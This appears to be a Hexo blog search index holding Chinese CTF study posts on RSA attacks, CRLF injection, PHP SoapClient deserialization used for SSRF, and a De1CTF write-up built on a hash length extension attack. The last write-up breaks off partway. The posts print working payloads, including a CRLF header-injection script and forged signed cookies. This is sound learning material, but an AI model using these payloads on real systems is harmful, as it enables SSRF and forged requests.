<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[RSA攻击方法总结]]></title>
    <url>%2F2019%2F08%2F22%2FRSA%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[一个多月没学密码学方面的东西了…赶紧补补 相关定理欧拉函数设n是一个正整数，小于n且与n互素的正整数的个数称为欧拉函数，记为φ(n)。欧拉函数具有以下性质： (1) 如果n是素数，则φ(n) = n-1(2) 如果m和n互素，则φ(mn) = φ(m)φ(n)(3) 如果 n = p1^a1 x p2^a2 ... x pt^at其中，p1&lt;p2&lt;…&lt;pt都是素数，ai&gt;0(i=1, 2, …, t)，则 φ(n) = n(1-1/p1)(1-1/p2)...(1-1/pt)欧几里得除法欧几里得除法是用于计算两个整数a和b的最大公因子d = gcd(a, b)的常用方法： 用较小数除较大数，再用出现的余数（第一余数）去除除数，再用出现的余数（第二余数）去除除数，如此反复，直到最后余数是0为止。如果是求两个数的最大公约数，那么最后的除数就是这两个数的最大公约数 使用python表示如下： 123456def gcd(m,n): while n: r=m%n m=n #经过一次求余数，进入第二轮相除，即n的值扮演了被除数的角色 n=r #r的值扮演了余数的角色 return m #这里return m的原因是，n作为最后一轮的除数已经赋值给了m 扩展欧几里得除法设a、b是两个不全为0的整数，则存在两个整数x，y，使得：gcd(a, b) = ax + by 使用python求x、y表示如下： 123456def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) 普通RSA算法1.秘钥生成(1) 选取两个保密的大素数p和q(2) 计算n = pq，φ(n) = (p-1)(q-1)(3) 随机选取整数e，1&lt;e&lt;φ(n)，满足gcd(e, φ(n)) = 1(4) 计算d，满足de ≡ 1 mod φ(n)(5) 公钥为(e, n)，私钥为d 2.加密c ≡ m^e mod n 3.解密m ≡ c^d mod n 公钥加密文件描述此类题目一般会给一个公钥文件(结尾通常为.pem或.pub)和密文(如flag.enc)。公钥文件内容格式如下： -----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr yigb/+l/vjDdAgMBAAE= -----END PUBLIC KEY-----可以使用openssl来提取e和n： openssl rsa -in pubkey.pem -pubin -noout -text -modulus也可使用Crypto库： 12345678from Crypto.PublicKey import RSAfrom Crypto.Util.number import inverse, long_to_bytesfrom Crypto.Cipher import PKCS1_v1_5import base64public_key = RSA.importKey(open("pubkey.pem").read())n = public_key.ne = public_key.e 例题pubkey.pem： -----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr yigb/+l/vjDdAgMBAAE= -----END PUBLIC KEY-----flag.enc(hex)： 6D 3E B7 DF 23 EE E1 D3 87 10 BE BA 78 A0 87 8E 0E 9C 65 BD 3D 08 49 6D DA 64 92 41 99 11 0C 79解题思路首先提取n和e： 12345from Crypto.PublicKey import RSApublic_key = RSA.importKey(open("pubkey.pem").read())n = public_key.ne = public_key.e 将n使用工具yafu分解(或在线分解质数网站：http://factordb.com)，得到p和q；之后生成私钥文件： 123456789101112131415161718from Crypto.PublicKey import RSAfrom Crypto.Util.number import inverse, long_to_bytesp = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239nn = (p-1)*(q-1)d = inverse(e, nn)keypair = RSA.generate(1024)keypair.p = pkeypair.q = qkeypair.e = ekeypair.n = nkeypair.d = dprivate_key = keypair.exportKey().decode('utf-8')f = open('private.pem', 'w')f.write(private_key) 最后使用openssl解密即可： openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.txt 多素数RSA算法描述多素数RSA系统可以使用超过两个素数的乘积作为模。秘钥生成算法如下： (1) 选取k个保密的大素数p1，p2，…，pk(2) 计算n = p1p2…pk，φ(n) = (p1-1)(p2-1)…(pk-1)(3) 随机选取整数e，1&lt;e&lt;φ(n)，满足gcd(e, φ(n)) = 1(4) 计算d，满足de ≡ 1 mod φ(n)(5) 公钥为(e, n)，私钥为d 多素数RSA加密和解密算法与普通RSA的相同 例题n= 703739435902178622788120837062252491867056043804038443493374414926110815100242619 e= 59159 c= 449590107303744450592771521828486744432324538211104865947743276969382998354463377 m=???解题思路首先将n分解，得到三个素数： P1 = 1108609086364627583447802163 P2 = 810971978554706690040814093 P3 = 782758164865345954251810941脚本： 123456789101112n= 703739435902178622788120837062252491867056043804038443493374414926110815100242619e= 59159c= 449590107303744450592771521828486744432324538211104865947743276969382998354463377p1 = 1108609086364627583447802163p2 = 810971978554706690040814093p3 = 782758164865345954251810941from Crypto.Util.number import inverse, long_to_bytesnn = (p1-1)*(p2-1)*(p3-1)d = inverse(e, nn)m = pow(c, d, n)flag = long_to_bytes(m)print(flag) RSA共享素数攻击描述当使用了p、q1和p、q2生成了n1和n2，就可以说p被n1和n2共享了。如果我们知道了这两个n，那么就可以很容易得到p、q1和q2，因为此时： p = gcd(n1, n2) q1 = n1/p q2 = n2/p例题flag=open(&quot;flag&quot;,&quot;rb&quot;).read() from Crypto.Util.number import getPrime,bytes_to_long p=getPrime(1024) q=getPrime(1024) e=65537 n=p*q m=bytes_to_long(flag) c=pow(m,e,n) print c,e,n p=getPrime(1024) e=65537 n=p*q m=bytes_to_long(&quot;1&quot;*32) c=pow(m,e,n) print c,e,n &apos;&apos;&apos; output: 2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597 65537 14967030059975114950295399874185047053736587880127990542035765201425779342430662517765063258784685868107066789475747180244711352646469776732938544641583842313791872986357504462184924075227433498631423289187988351475666785190854210389587594975456064984611990461126684301086241532915267311675164190213474245311019623654865937851653532870965423474555348239858021551589650169602439423841160698793338115204238140085738680883313433574060243600028500600824624358473403059597593891412179399165813622512901263380299561019624741488779367019389775786547292065352885007224239581776975892385364446446185642939137287519945974807727 3829060039572042737496679186881067950328956133163629908872348108160129550437697677150599483923925798224328175594483217938833520220087230303470138525970468915511111320396185482564783975435346354440035776909781158407636044986403819840648379609630039348895415045723208843631191252142600667607807479954194447237061080618370787672720344741413537975922184859333432197766580150534457001196765621678659952108010596273244230812327182786329760844037149719587269632133595149294067490955644893402708720284179715002149224068928828656515326446881791228638008572889331511945042911372915003805505412099102954073299010951896955362470 65537 14624662628725820618622370803948630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057550227048399837243392490762167733083030368221240764693694321150104306044125934201699430146970466657410999261630825931178731857267599750324918610790098952520113593130245010530961350592735239454337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741874033756970724357470539589848548704573091633917869387239324447730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979 &apos;&apos;&apos;解题思路由题目可知第二次加密使用的q是相同的 脚本： 12345678910111213n1 = 14967030059975114950295399874185047053736587880127990542035765201425779342430662517765063258784685868107066789475747180244711352646469776732938544641583842313791872986357504462184924075227433498631423289187988351475666785190854210389587594975456064984611990461126684301086241532915267311675164190213474245311019623654865937851653532870965423474555348239858021551589650169602439423841160698793338115204238140085738680883313433574060243600028500600824624358473403059597593891412179399165813622512901263380299561019624741488779367019389775786547292065352885007224239581776975892385364446446185642939137287519945974807727n2 = 14624662628725820618622370803948630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057550227048399837243392490762167733083030368221240764693694321150104306044125934201699430146970466657410999261630825931178731857267599750324918610790098952520113593130245010530961350592735239454337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741874033756970724357470539589848548704573091633917869387239324447730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979e = 65537c = 2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597from Crypto.Util.number import GCD, long_to_bytes, inverseq = GCD(n1, n2)p1 = n1//qnn1 = (p1-1)*(q-1)d = inverse(e, nn1)flag = pow(c, d, n1)print(long_to_bytes(flag)) RSA共模攻击描述该攻击的基本条件： 同一份明文m使用不同的秘钥加密了两次或两次以上 生成秘钥时模数n相同但加密指数e不相同，e1、e2互素 我们能拿到不同的密文c1、c2和模数n、加密指数e1、e2 此时可在不知道d1、d2的情况下解出m，原理详见文章 例题n = 116547141139745534253172934123407786743246513874292261984447028928003798881819567221547298751255790928878194794155722543477883428672342894945552668904410126460402501558930911637857436926624838677630868157884406020858164140754510239986466552869866296144106255873879659676368694043769795604582888907403261286211 c1 = 78552378607874335972488545767374401332953345586323262531477516680347117293352843468592985447836452620945707838830990843415342047337735534418287912723395148814463617627398248738969202758950481027762126608368555442533803610260859075919831387641824493902538796161102236794716963153162784732179636344267189394853 c2 = 98790462909782651815146615208104450165337326951856608832305081731255876886710141821823912122797166057063387122774480296375186739026132806230834774921466445172852604926204802577270611302881214045975455878277660638731607530487289267225666045742782663867519468766276566912954519691795540730313772338991769270201 e1 = 1804229351 e2 = 17249876309解题思路脚本： 12345678910111213141516171819202122232425from Crypto.Util.number import inverse, long_to_bytesfrom libnum import xgcddef common_attack(n,c1,c2,e1,e2): s = xgcd(e1, e2) s1 = s[0] s2 = s[1] # 求模反元素 if s1 &lt; 0: s1 = - s1 c1 = inverse(c1, n) elif s2 &lt; 0: s2 = - s2 c2 = inverse(c2, n) m = pow(c1, s1, n) * pow(c2, s2, n) % n return mn = 116547141139745534253172934123407786743246513874292261984447028928003798881819567221547298751255790928878194794155722543477883428672342894945552668904410126460402501558930911637857436926624838677630868157884406020858164140754510239986466552869866296144106255873879659676368694043769795604582888907403261286211c1 = 78552378607874335972488545767374401332953345586323262531477516680347117293352843468592985447836452620945707838830990843415342047337735534418287912723395148814463617627398248738969202758950481027762126608368555442533803610260859075919831387641824493902538796161102236794716963153162784732179636344267189394853c2 = 98790462909782651815146615208104450165337326951856608832305081731255876886710141821823912122797166057063387122774480296375186739026132806230834774921466445172852604926204802577270611302881214045975455878277660638731607530487289267225666045742782663867519468766276566912954519691795540730313772338991769270201e1 = 1804229351e2 = 17249876309result=common_attack(n,c1,c2,e1,e2)print(long_to_bytes(result)) 如果题目给了多组(&gt;2组)c和n，那么需要通过遍历去找哪两个e是互素的，之后再使用上面的方法求解即可 e=1当e为1时： c ≡ m^e mod n = m mod n m = c + n*k (k=0,1,2...)例题 N=0x180be86dc898a3c3a710e52b31de460f8f350610bf63e6b2203c08fddad44601d96eb454a34dab7684589bc32b19eb27cffff8c07179e349ddb62898ae896f8c681796052ae1598bd41f35491175c9b60ae2260d0d4ebac05b4b6f2677a7609c2fe6194fe7b63841cec632e3a2f55d0cb09df08eacea34394ad473577dea5131552b0b30efac31c59087bfe603d2b13bed7d14967bfd489157aa01b14b4e1bd08d9b92ec0c319aeb8fedd535c56770aac95247d116d59cae2f99c3b51f43093fd39c10f93830c1ece75ee37e5fcdc5b174052eccadcadeda2f1b3a4a87184041d5c1a6a0b2eeaa3c3a1227bc27e130e67ac397b375ffe7c873e9b1c649812edcd e=0x1 c=0x4963654354467b66616c6c735f61706172745f736f5f656173696c795f616e645f7265617373656d626c65645f736f5f63727564656c797d解题脚本： 12345678910111213141516from Crypto.Util.number import long_to_bytesN=0x180be86dc898a3c3a710e52b31de460f8f350610bf63e6b2203c08fddad44601d96eb454a34dab7684589bc32b19eb27cffff8c07179e349ddb62898ae896f8c681796052ae1598bd41f35491175c9b60ae2260d0d4ebac05b4b6f2677a7609c2fe6194fe7b63841cec632e3a2f55d0cb09df08eacea34394ad473577dea5131552b0b30efac31c59087bfe603d2b13bed7d14967bfd489157aa01b14b4e1bd08d9b92ec0c319aeb8fedd535c56770aac95247d116d59cae2f99c3b51f43093fd39c10f93830c1ece75ee37e5fcdc5b174052eccadcadeda2f1b3a4a87184041d5c1a6a0b2eeaa3c3a1227bc27e130e67ac397b375ffe7c873e9b1c649812edcde=0x1c=0x4963654354467b66616c6c735f61706172745f736f5f656173696c795f616e645f7265617373656d626c65645f736f5f63727564656c797dn = int(N)c = int(c)k = 0while 1: m = c + n*k s = long_to_bytes(m) if '&#123;' and '&#125;' in str(s): print(s) break else: k += 1]]></content>
      <categories>
        <category>crypto</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CRLF && SOAP学习]]></title>
    <url>%2F2019%2F08%2F14%2FCRLF%20%26%26%20SOAP%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[CRLFCRLF指的是回车符(CR，\r，%0d)和换行符(LF，\n，%0a)： 回车符：光标移到行首 换行符：光标垂直移动到下行 不同的操作系统，行的结束符是不一样的： Windows：使用CRLF表示行的结束 Linux：使用LF表示行的结束 在HTTP规范中，应使用CRLF来结束每行，Header与Body由两个CRLF分隔 举个栗子： 1234&lt;?phpif(isset($_GET['url']))&#123; header("Location: " . $_GET['url']);&#125; 正常构造： ?url=index.php响应头： HTTP/1.1 302 Found Date: Wed, 14 Aug 2019 11:44:46 GMT Server: Apache/2.4.29 (Ubuntu) Location: index.php Content-Length: 226 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8但当我们构造： ?url=index.php%0d%0aSet-Cookie:crlf=true响应头可能会是下面的内容： HTTP/1.1 302 Found Date: Wed, 14 Aug 2019 11:44:46 GMT Server: Apache/2.4.29 (Ubuntu) Location: index.php Set-Cookie: crlf=true Content-Length: 226 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8那么此时便产生了CRLF漏洞，上述产生的漏洞属于固定会话漏洞；当注入两个CRLF时，便能控制返回给浏览器的主体内容 SOAPWeb Services提供一个建立分布式应用的平台，使得运行在不同操作系统和不同设备上的软件，或者用不同程序语言和不同厂商的软件开发工具开发的软件，所有可能的已开发和部署的软件，能够利用这一平台实现分布式计算的目的。最基本的 Web Services是基于 XML 和 HTTP 的 WebService三要素： SOAP WSDL：Web Service Description Language，即Web Services描述，是基于XML的用于描述Web Services以及如何访问Web Services的语言 UDDI：Universal Description，Discovery and Integration，即通用的描述，发现及整合，用来描述访问特定的Web Services的一些相关的信息 SOAP,即Simple Object Access Protocol,简单对象访问协议; 是用于在应用程序之间进行通信的一种通信协议 一条 SOAP消息的组成： 一个包含有一个必需的 SOAP 的封装包 一个可选的 SOAP 标头 一个必需的 SOAP 体块的 XML 文档 SOAP消息格式： &lt;?xml 0...version=&quot;1.0&quot;?&gt; &lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2001/12/soap-envelope&quot; soap:encodingStyle=&quot;http://www.w3.org/2001/12/soap-encoding&quot;&gt; &lt;soap:Header&gt; &lt;/soap:Header&gt; &lt;soap:Body&gt; &lt;soap:Fault&gt; &lt;/soap:Fault&gt; &lt;/soap:Body&gt; &lt;/soap:Envelope&gt;其中： Envelope: 标识XML文档，具有名称空间和编码详细信息。 Header：包含标题信息，如内容类型和字符集等。 Body：包含请求和响应信息。 Fault：错误和状态信息。 PHP SOAPPHP5中新增了内置的SOAP扩展；开发者可以使用SOAP扩展来编写自己的Web Services，也可以写一些客户端来使用Web Services PHP的SOAP扩展中实现了6个类： SoapClient SoapServer SoapFault SoapHeader SoapParam SoapVar 其中，前三个类是高级类，后三个类除了构造器外没有其他别的方法，属于低级类;重点要学习SoapClient这个类 利用SoapClient从反序列化产生SSRF查看PHP手册： The SoapClient class provides a client for [» SOAP 1.1](http://www.w3.org/TR/soap11/), [» SOAP 1.2](http://www.w3.org/TR/soap12/) servers. It can be used in WSDL or non-WSDL mode. 查看该类内置方法，可以看到有个__construct，查看描述：此函数是该函数的别名： SoapClient::SoapClient()，那么继续查看SoapClient::SoapClient() 用法： public SoapClient::SoapClient ( mixed $wsdl [, array $options ] )参数说明： wsdl：URI of the WSDL file or NULL if working in non-WSDL mode. options：An array of options. If working in WSDL mode, this parameter is optional.If working in non-WSDL mode, the location and uri options must be set, where location is the URL of the SOAP server to send the request to, and uri is the target namespace of the SOAP service. 如果是wsdl模式,在序列化之前就会对options中的url进行请求;如果是非wsdl模式,反序列化的时候会对options的url进行请求 在本地进行简单测试(已开启soap扩展),首先生成SoapClient对象序列化后的字符串: 123&lt;?php$a = new SoapClient(null, array('location' =&gt; 'http://101.132.41.135:666', 'uri' =&gt; '123'));echo serialize($a); 之后进行反序列化，并调用一个SoapClient对象中不存在的方法: 1234&lt;?php$a = 'O:10:"SoapClient":3:&#123;s:3:"uri";s:3:"123";s:8:"location";s:25:"http://101.132.41.135:666";s:13:"_soap_version";i:1;&#125;';$soap = unserialize($a);$soap-&gt;abc(); 将上述反序列化代码在本地保存为www下的unserialize.php,，之后在vps进行监听: nc -lvvp 666之后访问127.0.0.1/unserialize.php，可看到成功获得了soap请求: root@iZuf6dyvi0xivm756htjv6Z:~# nc -lvvp 666 Listening on [0.0.0.0] (family 0, port 666) Connection from [106.34.138.118] port 666 [tcp/*] accepted (family 2, sport 9234) POST / HTTP/1.1 Host: 101.132.41.135:666 Connection: Keep-Alive User-Agent: PHP-SOAP/5.6.40-10+ubuntu18.04.1+deb.sury.org+1 Content-Type: text/xml; charset=utf-8 SOAPAction: &quot;123#abc&quot; Content-Length: 366 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;123&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:abc/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; root@iZuf6dyvi0xivm756htjv6Z:~# 利用SoapClient从反序列化到SSRF再到CRLF虽然上面触发了SSRF，但是可以利用的地方很少，因为SOAP的数据包格式不符合POST请求的数据包格式 查看可用的$options参数选项，发现有个user-agent选项 The user_agent option specifies string to use in User-Agent header. 既然可以构造user-agent，那么就可以进行CRLF： 要POST数据就要使得Content-Type为application/x-www-form-urlencoded，但是不能将原有的Content-Type: text/xml;覆盖掉；但可以发现User-Agent是在Content-Type前面的，因此可以控制User-Agent来控制Content-Type，通过控制Content-Length来控制Body部分 相关脚本： 1234567891011121314&lt;?php$target = 'http://127.0.0.1:666';$post_string = 'username=admin';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93' );$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' =&gt; "aaab"));$aaa = serialize($b);$aaa = str_replace('^^',"\r\n",$aaa);$aaa = str_replace('&amp;','&amp;',$aaa);echo bin2hex($aaa);?&gt; 便可通过此方式构造POST请求去探测内网 参考文章:http://www.vuln.cn/6122https://www.jianshu.com/p/2f2e311e797bhttps://www.cnblogs.com/yzw23333/p/7245104.htmlhttps://delcoding.github.io/2018/03/n1ctf-easy-harder-php1/https://xz.aliyun.com/t/2148#toc-0https://skysec.top/2018/08/17/SOAP%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/#SOAP%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BCRLF%E4%B8%8ESSRF%EF%BC%88%E4%BA%8C%EF%BC%89]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[De1CTF SSRF Me && ShellShellShell wp]]></title>
    <url>%2F2019%2F08%2F10%2FDe1CTF%20SSRF%20Me%20%26%26%20Shell%20Shell%20Shell%20wp%2F</url>
    <content type="text"><![CDATA[难哭了 SSRF Me123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result['code'] = 500 if (self.checkSign()): if "scan" in self.action: tmpfile = open("./%s/result.txt" % self.sandbox, 'w') resp = scan(self.param) if (resp == "Connection Timeout"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if "read" in self.action: f = open("./%s/result.txt" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = "Action Error" else: result['code'] = 500 result['msg'] = "Sign Error" return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route("/geneSign", methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get("param", "")) action = "scan" return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get("action")) param = urllib.unquote(request.args.get("param", "")) sign = urllib.unquote(request.cookies.get("sign")) ip = request.remote_addr if(waf(param)): return "No Hacker!!!!" task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/')def index(): return open("code.txt","r").read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return "Connection Timeout"def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith("gopher") or check.startswith("file"): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80) 相关函数方法： 1.urllib.unquote(string)：对字符串进行url解码 2.request.args.get()方法可以获取Get请求URL中的参数，该函数的第二个参数是默认值，当URL参数不存在时，则返回默认值；request.cookies.get()即获取cookie值 3.os.path.exists()判断文件/文件夹是否存在，存在则返回True，否则返回False 4.urllib.urlopen(url, data=None, proxies=None)创建一个表示远程url的类文件对象，然后像本地文件一样操作这个类文件对象来获取远程数据 存在两个路由： 1./geneSign 12345@app.route("/geneSign", methods=['GET', 'POST']) def geneSign(): param = urllib.unquote(request.args.get("param", "")) action = "scan" return getSign(action, param) 2./De1ta 12345678910@app.route('/De1ta',methods=['GET','POST']) def challenge(): action = urllib.unquote(request.cookies.get("action")) param = urllib.unquote(request.args.get("param", "")) sign = urllib.unquote(request.cookies.get("sign")) ip = request.remote_addr if(waf(param)): return "No Hacker!!!!" task = Task(action, param, sign, ip) return json.dumps(task.Exec()) 主要分析第二个路由 接收四个参数： 1234action = urllib.unquote(request.cookies.get(&quot;action&quot;))param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))ip = request.remote_addr 并且会检测param中是否触发了waf，将param的值两边去除空格，并且将字母转为小写，检测是否以gopher开头、以file开头： 123456def waf(param): check=param.strip().lower() if check.startswith("gopher") or check.startswith("file"): return True else: return False 之后会创建task对象，将四个参数传到Task类中，并调用Exec()方法 Task类初始化时会根据传递的四个参数创建四个属性： 12345def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) Exec方法中会判断checkSgin()，为True才会往下执行： 12345def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False checkSign调用了getSign函数： 12def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() 在checkSign判断之后，有两个判断语句： if &quot;scan&quot; in self.action if &quot;read&quot; in self.action方法一一个是读取，一个是写：写入文件时，先在geneSign路由使得param=flag.txt（题目给出提示flag is in ./flag.txt），因为这个路由的action恒为scan，得到hash值后，在De1ta路由使得param=flag.txt，action=scan，这样便绕过了checkSign的检查，成功的把flag.txt内容写入到了/%s/result.txt&quot; % self.sandbox GET /De1ta?param=flag.txt HTTP/1.1 Host: 139.180.128.86 Cookie: sign=8370bdba94bd5aaf7427b84b3f52d7cb; action=scan读取文件时，绕过checkSign后还会判断action中的值是否有read，有才会读取，那么需要改变action的值；secret_key值不知道，但是知道长度secert_key = os.urandom(16)，那么可以利用hash扩展攻击，即已知： md5(secret_key+&apos;scan&apos;) = e0875c4e6149bc7fd90b7ed1548b04df length(secret_key) = 16求： md5(secret_key+param+action)那么可以使得param为空，使action中出现read，使用安装的python3的hashpumpy： 12345from hashpumpy import *print(hashpump('e0875c4e6149bc7fd90b7ed1548b04df', 'scan', 'read', 16)('4e5e3cd2e040a695869c672ada5af0dd', b'scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00read'))# hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message) GET /De1ta HTTP/1.1 Host: 139.180.128.86 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Cookie: sign=4e5e3cd2e040a695869c672ada5af0dd; action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%a0%00%00%00%00%00%00%00read但是发现无论构造什么写入的内容，都读不出来，原来是需要用条件竞争……比完赛看wp才发现这种方法真是太nc了。。。在读文件时，构造的action中同时含有scan和read，且没有传param参数，那么在读之前就会重新写一遍文件，那么之后再读就不能直接读到了 方法二使action中同时出现scan和read，再传递参数param=flag.txt，便可直接读到flag geneSign路由的action恒为scan，那么当param=flag.txt时，getSign为： md5(secret_key+&apos;flag.txt&apos;+&apos;scan&apos;)那么要使read出现在action中，可以添加在flag.txt后，便可获取其hash： md5(secret_key+&apos;flag.txtread&apos;+&apos;scan&apos;)在De1ta路由中，由于读取的是param中的内容，便可将flag.txt与read分隔开，使action的值为readscan，即： md5(secret_key+&apos;flag.txtread&apos;+&apos;scan&apos;) ==&gt; md5(secret_key+&apos;flag.txt&apos;+&apos;readscan&apos;)步骤如下： 1.请求http://139.180.128.86/geneSign?param=flag.txtread得到sign2.发包： GET /De1ta?param=flag.txt HTTP/1.1 Host: 139.180.128.86 Cookie: sign=7cde191de87fe3ddac26e19acae1525e; action=readscanShellShellShell1.扫描目录： [17:30:53] 200 - 16KB - /.config.php.swp [17:32:13] 200 - 0B - /config.php [17:32:46] 301 - 318B - /img -&gt; http://45.76.187.90:11027/img/ [17:32:48] 302 - 0B - /index.php -&gt; index.php?action=login [17:32:48] 302 - 0B - /index.php/login/ -&gt; index.php?action=login [17:33:26] 200 - 83KB - /phpinfo.php [17:33:56] 301 - 321B - /static -&gt; http://45.76.187.90:11027/static/ [17:34:14] 301 - 321B - /upload -&gt; http://45.76.187.90:11027/upload/ [17:34:14] 200 - 743B - /upload/ [17:34:17] 200 - 0B - /user.php分析config文件，至此，我已经死在了第一步了～看了wp，才知道所有源码文件都可以得到-_-赶紧扩充了一下字典：获得.index.php.swp，恢复后里面第一行代码为require_once &#39;user.php&#39;;，则推测有.user.php.swp，获得后，恢复里面的内容，发现提示 There is a bug when making the contest so... goto `http://45.76.187.90:11027/user.php.bak` to get the source code of &quot;user.php&quot;那么访问user.php.bak，获得源码，三个文件的关系： index.php -&gt; require_once &apos;user.php&apos; user.php -&gt; require_once &apos;config.php&apos;又在index.php发现：require_once &#39;views/&#39;.$_GET[&#39;action&#39;];，则访问views这个目录，发现了一些源码文件 2.先看config.php，最后一行代码执行了addsla_all();： 12345678910111213141516function addsla_all()&#123; if (!get_magic_quotes_gpc()) &#123; if (!empty($_GET)) &#123; $_GET = addslashes_deep($_GET); &#125; if (!empty($_POST)) &#123; $_POST = addslashes_deep($_POST); &#125; $_COOKIE = addslashes_deep($_COOKIE); $_REQUEST = addslashes_deep($_REQUEST); &#125;&#125; 这个函数调用了addslashes_deep()： 1234567891011function addslashes_deep($value)&#123; if (empty($value)) &#123; return $value; &#125; else &#123; return is_array($value) ? array_map('addslashes_deep', $value) : addslashes($value); &#125;&#125; 相关内置函数：(1).array_map()：为数组的每个元素应用回调函数(2).addslashes()：在某些字符前加上反斜线：单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符） 那么这两个定义的函数的作用就是对全局输入的特殊字符进行转义 3.接下来在user.php中在Customer类中的register方法中发现注释： 12345678if(!$this-&gt;is_exists($username)) &#123; $db = new Db(); @$ret = $db-&gt;insert(array('username','password','ip','is_admin','allow_diff_ip'),'ctf_users',array($username,$password,get_ip(),'0','1')); //No one could be admin except me if($ret) return true; else return false;&#125; 